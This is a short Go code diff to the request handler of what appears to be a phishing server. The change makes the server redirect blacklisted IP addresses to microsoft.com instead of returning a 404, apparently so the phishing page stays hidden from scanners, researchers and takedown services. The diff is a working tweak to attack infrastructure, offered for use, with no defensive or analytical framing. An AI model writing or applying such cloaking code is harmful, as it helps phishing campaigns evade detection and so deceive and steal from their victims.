@@ -228,8 +228,9 @@ func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
 	address := strings.Split(r.RemoteAddr, ":")[0]
 	log.Infof("Extracted IP: %s", address)
 	if stringInSlice(address, lines) {
-		log.Infof("Visitor is in blacklist, returning 404")
-		http.NotFound(w, r)
+		log.Infof("Visitor is in blacklist, returning 302")
+		http.Redirect(w, r, "https://microsoft.com", 302)
+		//http.NotFound(w, r)
 		return
 	}
 
